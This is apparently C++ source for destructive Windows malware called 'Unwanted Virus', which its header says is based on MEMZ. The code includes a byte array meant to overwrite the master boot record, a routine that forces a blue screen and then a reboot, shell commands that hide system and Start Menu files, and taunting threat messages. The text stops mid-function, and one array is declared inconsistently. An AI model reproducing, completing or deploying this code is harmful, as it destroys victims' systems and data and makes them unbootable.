/*-------------------------------------------+
|                                            |
|   Unwanted Virus Source Code               |
|                                            |
|   (C) BenjaminFretez 2021.                 |
|                                            |
+--------------------------------------------*/

/* This malware is based on the MEMZ malware */

/* include files */
#include <windows.h> // Required for WINAPI
#include <iostream> // Required for input-output
#include <fstream> // Required for files
#include <stdio.h>

/* required for downloading files*/
#pragma comment (lib, "urlmon.lib")

using namespace std;

DWORD wb;

/* files content */
const unsigned char msg[] = "Hello! You have ran the called Úñåáñþéd ßí®ú’ (Unwanted Virus)\r\n\r\nYour computer is now done for anyway,\r\nkilling Unwanted.exe process will not do anything, just it rewrited the MBR...\r\nYour eta is 2 minutes, THE TIME IS RUNNING! =)";
const size_t msg_len = sizeof(msg);

const unsigned char diem[] = "ÜÓÚ ÑÉÉÐ ÞÓ ÐÍÉÉÉÉ²¼2ð¤ú®¥½ö’«   ÜÓÚ ÑÉEÐ TÓ ÐÍÉ YOU NEED TO DIEÉÉÉ aáaááá €€¼€³¤²¤¤¬²¬\r\nïñ§tág®áµ@Endersshow@#RT#$tþ¤³þ³å³äs³®É F3¤€Þ³TÅ®¤ÅÞ€ÜÉÜWÞÜÉ€Ü¤\r\n WHY ARE YOU RUNNING? WHY ARE YOU RUNNING? ÁÄÉ³ÁÅÅÁÅAÁÄÉ®Ü¼Ú¼½Í¾»¬»«¥®²³ÞÄ³®";
const size_t die_len = sizeof(diem);

const unsigned char lastm[] = "ÜÓÚ\n YOU COMPUTER WILL DIE IN 10 SECONDS €¤ÜÞÅ³®²®¤³Þ\r\n³€ÞÜ¤Wé nééð á ñéwc ímputyer guys¼€ÚÉ6YE³\r\n®²¤Þ¤€Ü¼Ú€Time is over, you killed it!¤Þ¤€Þ¤\r\n³é³å²€Þ¤";
const size_t last_len = sizeof(lastm);

const unsigned char escapem[] = "Hey! The escape is behind you,\r\nLook behind you please, Is there!!";
const size_t escape_len = sizeof(escapem);


const unsigned char batm[] = { 0xEF, 0xBB, 0xBF, 0x40, 0x65, 0x63, 0x68, 0x6F, 0x20, 0x6F, 0x66, 0x66, 0x0D, 0x0A, 0x63, 0x64,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x01, 0x00, 0x18, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x80,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x80,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x01, 0x00, 0x09, 0x04, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00,
0x60, 0x40, 0x00, 0x00, 0x7D, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x3C, 0x3F, 0x78, 0x6D, 0x6C, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F,
0x6E, 0x3D, 0x27, 0x31, 0x2E, 0x30, 0x27, 0x20, 0x65, 0x6E, 0x63, 0x6F,
0x64, 0x69, 0x6E, 0x67, 0x3D, 0x27, 0x55, 0x54, 0x46, 0x2D, 0x38, 0x27,
0x20, 0x73, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x6C, 0x6F, 0x6E, 0x65, 0x3D,
0x27, 0x79, 0x65, 0x73, 0x27, 0x3F, 0x3E, 0x0D, 0x0A, 0x3C, 0x61, 0x73,
0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73,
0x3D, 0x27, 0x75, 0x72, 0x6E, 0x3A, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61,
0x73, 0x2D, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2D,
0x63, 0x6F, 0x6D, 0x3A, 0x61, 0x73, 0x6D, 0x2E, 0x76, 0x31, 0x27, 0x20,
0x6D, 0x61, 0x6E, 0x69, 0x66, 0x65, 0x73, 0x74, 0x56, 0x65, 0x72, 0x73,
0x69, 0x6F, 0x6E, 0x3D, 0x27, 0x31, 0x2E, 0x30, 0x27, 0x3E, 0x0D, 0x0A,
0x20, 0x20, 0x3C, 0x74, 0x72, 0x75, 0x73, 0x74, 0x49, 0x6E, 0x66, 0x6F,
0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3D, 0x22, 0x75, 0x72, 0x6E, 0x3A,
0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2D, 0x6D, 0x69, 0x63, 0x72,
0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2D, 0x63, 0x6F, 0x6D, 0x3A, 0x61, 0x73,
0x6D, 0x2E, 0x76, 0x33, 0x22, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
0x3C, 0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x3E, 0x0D, 0x0A,
0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x72, 0x65, 0x71, 0x75, 0x65,
0x73, 0x74, 0x65, 0x64, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6C, 0x65, 0x67,
0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
0x20, 0x3C, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x45,
0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E, 0x4C, 0x65, 0x76, 0x65,
0x6C, 0x20, 0x6C, 0x65, 0x76, 0x65, 0x6C, 0x3D, 0x27, 0x61, 0x73, 0x49,
0x6E, 0x76, 0x6F, 0x6B, 0x65, 0x72, 0x27, 0x20, 0x75, 0x69, 0x41, 0x63,
0x63, 0x65, 0x73, 0x73, 0x3D, 0x27, 0x66, 0x61, 0x6C, 0x73, 0x65, 0x27,
0x20, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C,
0x2F, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x50, 0x72,
0x69, 0x76, 0x69, 0x6C, 0x65, 0x67, 0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20,
0x20, 0x20, 0x20, 0x3C, 0x2F, 0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74,
0x79, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x2F, 0x74, 0x72, 0x75, 0x73,
0x74, 0x49, 0x6E, 0x66, 0x6F, 0x3E, 0x0D, 0x0A, 0x3C, 0x2F, 0x61, 0x73,
0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x3E, 0x0D, 0x0A, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
0x84, 0x01, 0x00, 0x00, 0x27, 0x30, 0x3C, 0x30, 0x57, 0x30, 0x6A, 0x30,
0x78, 0x30, 0x7F, 0x30, 0x9C, 0x30, 0xA8, 0x30, 0xB3, 0x30, 0xCA, 0x30,
0xDA, 0x30, 0xFC, 0x30, 0x22, 0x31, 0x2A, 0x31, 0x32, 0x31, 0x39, 0x31,
0x3E, 0x31, 0x46, 0x31, 0x4D, 0x31, 0x52, 0x31, 0x5A, 0x31, 0x73, 0x31,
0x7A, 0x31, 0x87, 0x31, 0xA7, 0x31, 0xB7, 0x31, 0xBE, 0x31, 0xC4, 0x31,
0xCD, 0x31, 0xD2, 0x31, 0xE3, 0x31, 0xF7, 0x31, 0xFC, 0x31, 0x02, 0x32,
0x08, 0x32, 0x0F, 0x32, 0x17, 0x32, 0x54, 0x32, 0x5B, 0x32, 0x64, 0x32,
0x6C, 0x32, 0x8F, 0x32, 0x9C, 0x32, 0xB5, 0x32, 0xF9, 0x32, 0x22, 0x33,
0x89, 0x33, 0xB4, 0x33, 0xC9, 0x33, 0xCE, 0x33, 0xD3, 0x33, 0xF4, 0x33,
0xF9, 0x33, 0x06, 0x34, 0x40, 0x34, 0x19, 0x35, 0x22, 0x35, 0x2D, 0x35,
0x34, 0x35, 0x47, 0x35, 0x55, 0x35, 0x5B, 0x35, 0x61, 0x35, 0x67, 0x35,
0x6D, 0x35, 0x73, 0x35, 0x7A, 0x35, 0x81, 0x35, 0x88, 0x35, 0x8F, 0x35,
0x96, 0x35, 0x9D, 0x35, 0xA4, 0x35, 0xAC, 0x35, 0xB4, 0x35, 0xBC, 0x35,
0xC8, 0x35, 0xD1, 0x35, 0xD6, 0x35, 0xDC, 0x35, 0xE6, 0x35, 0xF0, 0x35,
0x00, 0x36, 0x10, 0x36, 0x20, 0x36, 0x29, 0x36, 0x89, 0x36, 0xB5, 0x36,
0xE8, 0x36, 0x0E, 0x37, 0x1D, 0x37, 0x34, 0x37, 0x3A, 0x37, 0x40, 0x37,
0x46, 0x37, 0x4C, 0x37, 0x52, 0x37, 0x58, 0x37, 0x6D, 0x37, 0x82, 0x37,
0x89, 0x37, 0x8F, 0x37, 0xA1, 0x37, 0xAB, 0x37, 0x13, 0x38, 0x20, 0x38,
0x48, 0x38, 0x5A, 0x38, 0x99, 0x38, 0xA8, 0x38, 0xB1, 0x38, 0xBE, 0x38,
0xD4, 0x38, 0x0E, 0x39, 0x17, 0x39, 0x2B, 0x39, 0x31, 0x39, 0x5E, 0x39,
0x64, 0x39, 0x8A, 0x39, 0x93, 0x39, 0x99, 0x39, 0xAC, 0x39, 0x78, 0x3A,
0x98, 0x3A, 0xA2, 0x3A, 0xC2, 0x3A, 0x02, 0x3B, 0x08, 0x3B, 0x65, 0x3B,
0x6E, 0x3B, 0x73, 0x3B, 0x86, 0x3B, 0x9A, 0x3B, 0x9F, 0x3B, 0xB2, 0x3B,
0xD1, 0x3B, 0xEE, 0x3B, 0x30, 0x3C, 0x35, 0x3C, 0x49, 0x3C, 0x53, 0x3C,
0x5C, 0x3C, 0x03, 0x3D, 0x0C, 0x3D, 0x14, 0x3D, 0x4F, 0x3D, 0x59, 0x3D,
0x62, 0x3D, 0x6B, 0x3D, 0x80, 0x3D, 0x89, 0x3D, 0xB8, 0x3D, 0xC1, 0x3D,
0xCA, 0x3D, 0xD8, 0x3D, 0xE1, 0x3D, 0x03, 0x3E, 0x0A, 0x3E, 0x19, 0x3E,
0x23, 0x3E, 0x29, 0x3E, 0x2F, 0x3E, 0x35, 0x3E, 0x3B, 0x3E, 0x41, 0x3E,
0x47, 0x3E, 0x4D, 0x3E, 0x53, 0x3E, 0x59, 0x3E, 0x5F, 0x3E, 0x65, 0x3E,
0x6B, 0x3E, 0x71, 0x3E, 0x77, 0x3E, 0x7D, 0x3E, 0x83, 0x3E, 0x89, 0x3E,
0x8F, 0x3E, 0x95, 0x3E, 0x9B, 0x3E, 0xA1, 0x3E, 0xA7, 0x3E, 0xAD, 0x3E,
0xB3, 0x3E, 0xB9, 0x3E, 0xBF, 0x3E, 0xC5, 0x3E, 0xCF, 0x3E, 0x00, 0x00,
0x00, 0x20, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x04, 0x31, 0x0C, 0x31,
0x18, 0x31, 0x1C, 0x31, 0x38, 0x31, 0x3C, 0x31, 0xC4, 0x32, 0xC8, 0x32,
0xD0, 0x32, 0x40, 0x33, 0x6C, 0x36, 0x70, 0x36, 0x8C, 0x36, 0x90, 0x36,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00 };
const size_t kwp_len = sizeof(kwp);


/* destroy screen variables */
HDC hdc = GetDC(HWND_DESKTOP);
int sw = GetSystemMetrics(SM_CXSCREEN);
int sh = GetSystemMetrics(SM_CYSCREEN);
HDC hW;
HWND hwnd;
RECT rekt;
int w, h;
POINT Pt[3];

HCRYPTPROV prov;

int scrw, scrh;


int random() {
    int out;
    CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
    return out & 0x7fffffff;
}


/* unused messages for message boxes*/

const int icon[] = {
    MB_ICONEXCLAMATION,
    MB_ICONWARNING,
    MB_ICONINFORMATION,
};

const char* title[] = {
    "úñåáñþéð mawøá®é",
    "\u0022ngoe\u0022",
    "UnWaNtEd vIrUs",
    "uNwAnTeD ViRuS",
    "\n",
};


const char* msgs[] = {
    "Hello? Do you like my trojan",
    "R U Crazy? U Ran UNWANTED VIRUS!!",
    "See how your computer is destroyed",
    "\n",
    "\u0022Really this is so?\u0022",
    "Do you like the desk-top Back--Ground",
    "Are you happy?",
    "Do you have a live right now?",
    "\nWhats going on?\n",
    "Help!!!",
    "zzzzzzzzzzz",
    "Enjoy the game after this!",
    "I will kill everyone\nStarting by you first",
    "dID your anti-VIRUS stop this?",
};


/* for message boxes on random position */
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {

    scrw = GetSystemMetrics(SM_CXSCREEN);
    scrh = GetSystemMetrics(SM_CYSCREEN);
    if (nCode == HCBT_CREATEWND) {
        CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

        if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
            HWND hwnd = (HWND)wParam;

            int x = random() % (scrw - pcs->cx);
            int y = random() % (scrh - pcs->cy);

            pcs->x = x;
            pcs->y = y;
        }
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

/* overwrite mbr content */
const unsigned char mbrContent[] = { 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFC, 0xB8, 0x00, 0xA0, 0x8E, 0xD8, 0x8E, 0xC0, 0xB4, 0x04, 0xA3,
0x90, 0xFC, 0x31, 0xC0, 0xB9, 0x48, 0x7E, 0x31, 0xFF, 0xF3, 0xAB, 0x8B, 0x05, 0x40, 0x40, 0xAB,
0x88, 0xC4, 0x92, 0xB8, 0x00, 0x1C, 0xAB, 0xB8, 0x98, 0xE6, 0xAB, 0xB8, 0x28, 0x14, 0xBB, 0x10,
0x25, 0xB1, 0x0B, 0xAB, 0x83, 0xC0, 0x16, 0x93, 0xAB, 0xFE, 0xC4, 0x93, 0xE2, 0xF5, 0x05, 0x8E,
0x15, 0x80, 0xFF, 0x5C, 0x75, 0xEB, 0xBF, 0xA0, 0xD4, 0xB1, 0x05, 0xB8, 0x04, 0x0B, 0xE8, 0x85,
0x01, 0x83, 0xC7, 0x3C, 0xE2, 0xF5, 0xBE, 0x96, 0xFC, 0x80, 0x7C, 0x02, 0x20, 0x72, 0x2D, 0xFE,
0xC5, 0x80, 0xFD, 0x37, 0x74, 0xAC, 0xAD, 0x97, 0xAD, 0x3C, 0x28, 0x74, 0x0B, 0x3C, 0x20, 0x75,
0x04, 0xC6, 0x44, 0xFE, 0x28, 0xE8, 0x5E, 0x01, 0x81, 0xFE, 0x72, 0xFD, 0x75, 0xDB, 0x88, 0xF0,
0x2C, 0x02, 0x72, 0xD2, 0x34, 0x01, 0x88, 0xC2, 0x88, 0xC6, 0xEB, 0xCA, 0x80, 0x74, 0x02, 0x08,
0x45, 0x83, 0xE5, 0x07, 0x52, 0x56, 0x55, 0x75, 0x0E, 0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x16, 0x8C,
0xFC, 0x74, 0xF6, 0x89, 0x16, 0x8C, 0xFC, 0xBE, 0x80, 0xFC, 0xB9, 0x04, 0x00, 0xAD, 0x3D, 0x40,
0x01, 0x97, 0x72, 0x43, 0xE8, 0x17, 0x01, 0x81, 0xEF, 0x42, 0x01, 0x8A, 0x05, 0x2C, 0x20, 0x72,
0x29, 0x56, 0x57, 0xB4, 0x04, 0xF6, 0xE4, 0x01, 0xC6, 0xAD, 0x97, 0xC6, 0x04, 0x20, 0xB8, 0x08,
0x0E, 0xE8, 0x02, 0x01, 0x5F, 0x5E, 0xEB, 0x1F, 0xAD, 0x09, 0xC0, 0x74, 0x2D, 0x3D, 0x00, 0xF0,
0x97, 0x73, 0x14, 0xE8, 0xE8, 0x00, 0x81, 0xC7, 0x3E, 0x01, 0xB8, 0x0C, 0x0C, 0x89, 0x7C, 0xFE,
0x80, 0xBD, 0x40, 0x01, 0x0B, 0x75, 0x05, 0x31, 0xC0, 0x89, 0x44, 0xFE, 0x80, 0x3D, 0x1C, 0x75,
0x06, 0xC7, 0x06, 0x92, 0xFC, 0x38, 0x0A, 0xE8, 0xC6, 0x00, 0xE2, 0xCC, 0xBE, 0x92, 0xFC, 0xAD,
0x08, 0xC0, 0x74, 0x0C, 0x04, 0x08, 0x75, 0x08, 0xB4, 0x1C, 0xFE, 0x0E, 0x91, 0xFC, 0x78, 0x4A,
0x89, 0x44, 0xFE, 0x8B, 0x3C, 0xE8, 0xAE, 0x00, 0x75, 0x2E, 0xB4, 0x02, 0xCD, 0x16, 0xA8, 0x04,
0x74, 0x02, 0x4F, 0x4F, 0xA8, 0x08, 0x74, 0x02, 0x47, 0x47, 0xA8, 0x03, 0x74, 0x0D, 0x83, 0x3E,
0x80, 0xFC, 0x00, 0x75, 0x06, 0x8D, 0x45, 0x08, 0xA3, 0x80, 0xFC, 0x97, 0x3D, 0xFE, 0xE5, 0x74,
0x07, 0x3D, 0x32, 0xE7, 0x74, 0x02, 0x89, 0x04, 0x5D, 0x5E, 0x5A, 0x8B, 0x04, 0x80, 0xFA, 0x01,
0x76, 0x0A, 0x05, 0x80, 0x02, 0x3D, 0x80, 0xD4, 0x72, 0x1B, 0xCD, 0x20, 0x48, 0x48, 0x72, 0x03,
0x83, 0xC0, 0x04, 0x50, 0xD1, 0xE8, 0xB1, 0xA0, 0xF6, 0xF1, 0xFE, 0xCC, 0x80, 0xFC, 0x94, 0x58,
0x72, 0x03, 0x80, 0xCE, 0x16, 0x89, 0x04, 0x05, 0x06, 0x0F, 0x93, 0xB9, 0x03, 0x00, 0xE4, 0x40,
0x3C, 0xFC, 0x72, 0x0D, 0xBF, 0x82, 0xFC, 0x83, 0x3D, 0x00, 0x74, 0x03, 0xAF, 0xE2, 0xF8, 0x89,
0x1D, 0xE9, 0xC2, 0xFE, 0x18, 0x18, 0x3C, 0x24, 0x3C, 0x7E, 0xFF, 0x24, 0x00, 0x80, 0x42, 0x18,
0x10, 0x48, 0x82, 0x01, 0x00, 0xBD, 0xDB, 0x7E, 0x24, 0x3C, 0x66, 0xC3, 0x00, 0x3C, 0x5A, 0xFF,
0xA5, 0x3C, 0x66, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x72, 0x02, 0x31, 0xC0,
0x89, 0x85, 0x40, 0x01, 0xAB, 0xC3, 0x51, 0x57, 0x9C, 0x50, 0xBB, 0xA4, 0x7D, 0x2E, 0xD7, 0x93,
0xB9, 0x0A, 0x00, 0xF8, 0x88, 0xF8, 0x88, 0xFC, 0xE8, 0xE1, 0xFF, 0xD0, 0xE3, 0xE2, 0xF5, 0x81,
0xC7, 0x6C, 0x02, 0x58, 0x40, 0xA8, 0x07, 0x75, 0xE0, 0x9D, 0x5F, 0x59, 0xC3, 0x4F, 0x55, 0xAA
};

/* payload thread */
DWORD WINAPI payloadThread(LPVOID parameter) {
    int delay = 0;
    int times = 0;
    int runtime = 0;

    int(*function)(int, int) = (int(*)(int, int))parameter;

    for (;;) {
        if (delay-- == 0) {
            delay = (*function)(times++, runtime);
        }

        runtime++;
        Sleep(10);
    }
}


/* kill Windows instant */
void killWindowsInstant() {

    // Try to force BSOD first
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
        BOOLEAN tmp1; DWORD tmp2;
        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc000029A, 0, 0, 0, 6, &tmp2);
    }

    // If the computer is still running, do it the normal way
    HANDLE token;
    TOKEN_PRIVILEGES privileges;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

/* hide files payload */ 
int HideC() {
    ShellExecuteA(NULL, NULL, "cmd", "/c attrib +s +h C:\\*.* /D > nul", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c attrib +s +h C:\\Windows\\*.* /D > nul", NULL, SW_HIDE);
    return S_OK;
}
int HidePrograms() {
    ShellExecuteA(NULL, NULL, "cmd", "/c attrib +s +h \u0022C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\*.*\u0022 /S /D", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c attrib +s +h \u0022%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\*.*\u0022 /S /D", NULL, SW_HIDE);
    return S_OK;
}

/* reverse text payload */
void strReverseW(LPWSTR str);

void enumerateChildren(HWND hwnd) {
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * rand());

    SendMessageW(hwnd, WM_GETTEXT, 8192, (LPARAM)str);
    strReverseW(str);
